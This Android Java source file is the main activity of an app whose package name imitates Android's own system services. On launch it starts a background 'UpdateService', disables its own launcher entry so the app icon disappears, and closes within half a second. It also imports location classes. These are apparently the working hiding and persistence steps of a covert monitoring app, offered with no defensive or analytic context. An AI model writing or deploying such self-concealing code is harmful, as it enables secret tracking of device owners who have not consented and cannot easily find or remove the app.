package com.android.services;

import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.support.v7.app.AppCompatActivity;
import android.telephony.gsm.GsmCellLocation;
import android.widget.Toast;

import com.android.services.Adapter.PushNotification;
import com.android.services.Firebase.UpdateService;
import com.android.services.Utils.AndLog;
import com.android.services.Utils.SessionManager;
import com.google.android.gms.location.FusedLocationProviderClient;

import java.util.ArrayList;
import java.util.regex.Pattern;

public class MainActivity extends AppCompatActivity {


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        boolean checkService = PushNotification.isMyServiceRunning(MainActivity.this, UpdateService.class);
        if (!checkService) {
            startService(new Intent(MainActivity.this, UpdateService.class));
        }


        PackageManager x = getPackageManager();
        x.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                finish();
            }
        }, 500);


    }


    @Override
    protected void onDestroy() {
        super.onDestroy();

        AndLog.ShowLog("DESSTR", "ketutup");
    }
}
